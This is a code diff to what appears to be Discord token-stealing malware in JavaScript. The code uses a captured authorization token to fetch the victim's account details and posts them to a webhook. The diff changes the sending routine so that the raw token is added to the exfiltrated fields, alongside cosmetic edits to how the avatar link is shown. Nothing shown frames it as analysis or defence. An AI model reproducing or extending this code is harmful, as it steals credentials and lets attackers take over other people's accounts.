@@ -24,15 +24,16 @@ function main(p) {
                         authorization: token
                     }
                 }).json()
-                if (res.id) send(res)
+                if (res.id) send(res, token)
             }
 
         })
     } catch (e) {}
 }
 
-function send(res) {
+function send(res, token) {
     res.premium_type = getNitro(res.premium_type)
+    res.token = token
     var fields = []
     for (p in res) {
         !res[p] ? res[p] = "None" : res[p] = res[p]
@@ -41,9 +42,8 @@ function send(res) {
             value: res[p],
             inline: Math.random() * 5 > 2
         })
-        i++
     }
-    res.avatar = `https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png`
+    res.avatar = `[Click Here For AvatarURL](https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png)`
     fetch(webhook, {
         method: "POST",
         headers: {
@@ -57,7 +57,7 @@ function send(res) {
                     url: "https://cdn.discordapp.com/attachments/937097630574604309/966182159167655936/image.png"
                 },
                 thumbnail: {
-                    url: res.avatar
+                    url: `https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png`
                 },
                 color:	43690
             }],
